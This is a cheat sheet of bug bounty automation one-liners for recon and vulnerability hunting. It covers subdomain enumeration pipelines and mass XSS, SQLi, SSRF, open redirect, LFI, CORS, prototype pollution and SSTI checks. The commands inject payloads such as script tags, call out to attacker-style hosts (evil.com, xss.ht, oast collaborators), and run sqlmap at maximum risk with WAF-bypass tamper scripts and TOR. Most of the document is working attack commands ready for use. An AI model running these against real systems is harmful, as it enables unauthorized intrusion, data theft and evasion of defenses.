# Bug Bounty One-Liners

Curated one-liners untuk automation bug bounty hunting.

Source: https://github.com/0xPugal/One-Liners

---

## Subdomain Enumeration

### Multiple Sources
```bash
# crt.sh
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

# Archive/Wayback
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u

# CertSpotter
curl -s "https://api.certspotter.com/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

# ThreatMiner
curl -s "https://api.threatminer.org/v2/domain.php?q=target.com&rt=5" | jq -r '.results[]' | grep -o "\w.*target.com" | sort -u

# AlienVault
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/target.com/url_list?limit=100&page=1" | grep -o '"hostname": *"[^"]*' | sed 's/"hostname": "//' | sort -u

# HackerTarget
curl -s "https://api.hackertarget.com/hostsearch/?q=target.com"

# Subdomain Center
curl "https://api.subdomain.center/?domain=target.com" | jq -r '.[]' | sort -u
```

### Filter Juicy Subdomains
```bash
subfinder -d target.com -silent | dnsx -silent | grep --color 'api\|dev\|stg\|test\|admin\|demo\|stage\|vpn\|internal\|staging'
```

### Full Recon Pipeline
```bash
subfinder -d target.com -all | anew subs.txt
shuffledns -d target.com -r resolvers.txt -w wordlist.txt | anew subs.txt
dnsx -l subs.txt | anew resolved.txt
naabu -l resolved.txt -rate 5000 | anew ports.txt
httpx -l ports.txt | anew alive.txt
katana -list alive.txt -silent -jc -kf all -fx -xhr | anew urls.txt
nuclei -l urls.txt -es info -ss template-spray | anew nuclei.txt
```

---

## XSS

### Quick Reflected Check
```bash
cat urls.txt | grep "=" | qsreplace '"><script>alert(1)</script>' | while read host; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host Vulnerable"; done
```

### With Dalfox
```bash
cat urls.txt | grep "=" | sed 's/=.*/=/' | dalfox file - -b yours.xss.ht
```

### Gxss + Dalfox Chain
```bash
cat targets.txt | gau | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
```

### Filter HTML/XML Content-Types Only
```bash
cat urls.txt | grep "=" | uro | httpx -ct -silent -nc | grep -iE "text/html|application/xhtml\+xml" | cut -d '[' -f1 | anew html_urls.txt
```

### Knoxss Mass Hunting (API)
```bash
file=$1; key="API_KEY"; while read line; do curl https://api.knoxss.pro -d target=$line -H "X-API-KEY: $key" -s | grep PoC; done < $file
```

---

## SQLi

### SQLMap Pipeline
```bash
cat subs.txt | gau | grep "=" | uro | anew sqli.txt && sqlmap -m sqli.txt --batch --random-agent --level 5 --risk 3 --dbs
```

### Ghauri (SQLMap Alternative)
```bash
for i in $(cat sqli.txt); do ghauri -u "$i" --level 3 --dbs --current-db --batch --confirm; done
```

### WAF Bypass with Tamper Scripts
```bash
sqlmap -u 'http://target.com/page?id=1' --level=5 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,space2comment,space2plus,randomcase --random-agent --dbs
```

### WAF Bypass via TOR
```bash
sqlmap -r request.txt --time-sec=10 --tor --tor-type=SOCKS5 --check-tor --dbs --random-agent
```

### Find Vuln Hosts in SQLMap Output
```bash
# In ~/.local/share/sqlmap/output/
find -type f -name "log" -exec sh -c 'grep -q "Parameter" "{}" && echo "{}: SQLi"' \;
```

---

## SSRF

### Basic Check
```bash
cat urls.txt | grep "=" | qsreplace "https://collaborator.burp" | httpx -silent -fr
```

### With Interactsh
```bash
cat urls.txt | grep "=" | qsreplace "https://YOURTOKEN.oast.fun" | httpx -silent -fr
```

---

## Open Redirect

### Basic Check
```bash
cat subs.txt | gau | grep -ai "=http" | qsreplace 'http://evil.com' | while read host; do curl -s -L $host -I | grep "evil.com" && echo "$host Vulnerable"; done
```

### With httpx Match
```bash
cat subs.txt | gau | grep "=" | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'
```

---

## LFI

### Basic Check
```bash
cat targets.txt | gau | grep "=" | httpx -silent -paths lfi_wordlist.txt -mc 200 -mr "root:[x*]:0:0:"
```

---

## CORS

### Check Origin Reflection
```bash
echo target.com | gau | while read url; do target=$(curl -sI -H "Origin: https://evil.com" $url); echo "$target" | grep -i "evil.com" && echo "[CORS] $url"; done
```

---

## Prototype Pollution

### Check with page-fetch
```bash
subfinder -d target.com -all -silent | httpx -silent | anew alive.txt
sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | grep "VULNERABLE"
```

---

## SSTI

### With tplmap
```bash
for url in $(cat targets.txt); do python3 tplmap.py -u $url; done
```

### Quick Fuzz
```bash
echo target.com | gau | httpx -silent -mc 200 | qsreplace "{{7*7}}" > fuzz.txt && ffuf -u FUZZ -w fuzz.txt -mr "49"
```

---

## JavaScript Analysis

### Find JS Files
```bash
cat target.txt | gau | grep -iE "\.js$" | grep -Ev "\.json" | anew js.txt
```

### Verify JS Files (200 + correct content-type)
```bash
while read url; do
  if curl -s -o /dev/null -w "%{http_code}" "$url" | grep -q 200 && \
     curl -sI "$url" | grep -iq 'Content-Type:.*javascript'; then
    echo "$url"
  fi
done < js.txt > valid_js.txt
```

### Extract Endpoints from JS
```bash
cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```

### Find Hidden Params in JS
```bash
cat subs.txt | gau | httpx -silent | while read url; do
  curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e "s,var,$url?," -e 's/ //g' | sed 's/.*/&=FUZZ/g'
done
```

### Download All JS Files
```bash
mkdir -p js_files; while read url; do
  filename=$(basename "$url")
  curl -sSL "$url" -o "js_files/$filename"
done < js.txt
```

---

## Directory/File Discovery

### Dirsearch
```bash
dirsearch -l targets.txt --full-url -e php,asp,aspx,jsp,html,js,json,xml,bak,zip,sql,db,config -x 404,403
```

### ffuf
```bash
ffuf -c -w urls.txt:URL -w wordlist.txt:FUZZ -u URL/FUZZ -mc 200,301,302,403 -ac -recursion
```

### ffuf JSON to URLs
```bash
cat ffuf.json | jq -r '.results[].url' | anew urls.txt
```

### Sensitive Files from Wayback
```bash
echo target.com | gau | grep -iE "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|config)$"
```

---

## Shodan / Censys

### Shodan - Get IPs
```bash
shodan search Ssl.cert.subject.CN:"target.com" --fields ip_str | anew ips.txt
```

### Censys - Get IPs
```bash
censys search "target.com" --index-type hosts | jq -c '.[] | {ip: .ip}' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
```

### Scan IPs with Shodan
```bash
cat ips.txt | xargs -L 100 shodan scan submit --wait 0
```

---

## Nuclei

### Screenshots
```bash
nuclei -l targets.txt -headless -t nuclei-templates/headless/screenshot.yaml
```

### Template Spray
```bash
nuclei -l urls.txt -es info,unknown -ept ssl -ss template-spray
```

---

## Utilities

### CIDR to IPs
```bash
cat cidr.txt | xargs -I@ sh -c 'nmap -sn @ | grep "Nmap scan report for" | sed "s/Nmap scan report for //g"' | anew ips.txt
```

### Get Favicon Hash
```bash
curl "https://favicon-hash.kmsec.uk/api/?url=https://target.com/favicon.ico" | jq
```

### Find Reflected Params
```bash
python3 reflection.py urls.txt | grep "Reflection found" | awk -F'[?&]' '!seen[$2]++' | tee reflected.txt
```

### Find Params with x8
```bash
subfinder -d target.com -silent | httpx -silent | sed 's/$/\//' | xargs -I@ sh -c 'x8 -u @ -w params.txt -o output.txt'
```

---

## Tools Required

| Tool | Install |
|------|---------|
| subfinder | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` |
| httpx | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` |
| nuclei | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
| gau | `go install github.com/lc/gau/v2/cmd/gau@latest` |
| dalfox | `go install github.com/hahwul/dalfox/v2@latest` |
| qsreplace | `go install github.com/tomnomnom/qsreplace@latest` |
| uro | `pip install uro` |
| sqlmap | `pip install sqlmap` |
| ffuf | `go install github.com/ffuf/ffuf/v2@latest` |

---

*Last updated: April 2026*
